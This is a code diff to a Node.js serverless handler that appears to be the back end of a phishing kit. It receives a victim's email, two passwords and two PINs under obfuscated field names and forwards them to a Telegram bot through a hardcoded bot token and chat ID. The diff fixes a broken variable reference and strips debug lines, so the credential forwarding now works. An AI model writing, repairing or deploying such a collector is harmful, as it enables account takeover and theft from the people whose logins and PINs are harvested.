@@ -9,13 +9,13 @@ module.exports = async function (req, res) {
   }
 
   if (req.method !== "POST") {
-    return res.status(405).json({ success: false});
+    return res.status(405).json({ success: false });
   }
 
   const TGBT = "8101561109:AAExMjN5xnJB2iLkFgCK3R4qFPIzWve6eMo";
   const TGCI = "893828008";
   if (!TGBT || !TGCI) {
-    return res.status(500).json({ success: false});
+    return res.status(500).json({ success: false });
   }
 
   const {
@@ -27,11 +27,10 @@ module.exports = async function (req, res) {
   } = req.body || {};
 
   if (!rcxrr || !psrd || !psrdp || !pnct || !pnctr) {
-    return res.status(400).json({ success: false});
-    console.log("DEBUG: Condition not met, sending 400 response.");
+    return res.status(400).json({ success: false });
   }
 
-  const message = `Eml: ${rxcrr}\nPswd1: ${psrd}\nPswd2: ${psrdp}\nPn1: ${pnct}\nPn2: ${pnctr}`;
+  const message = `Eml: ${rcxrr}\nPswd1: ${psrd}\nPswd2: ${psrdp}\nPn1: ${pnct}\nPn2: ${pnctr}`;
 
   try {
     const tgRes = await fetch(`https://api.telegram.org/bot${TGBT}/sendMessage`, {
@@ -47,13 +46,11 @@ module.exports = async function (req, res) {
       const errorData = await tgRes.json();
       return res.status(500).json({
         success: false,
-        console.log("DEBUG: Not sent, sending esponse.");
       });
     }
 
     return res.status(200).json({ success: true });
   } catch (err) {
     return res.status(500).json({ success: false});
-    console.log("DEBUG: Condition not met err 200, sending 200 response.");
   }
 };
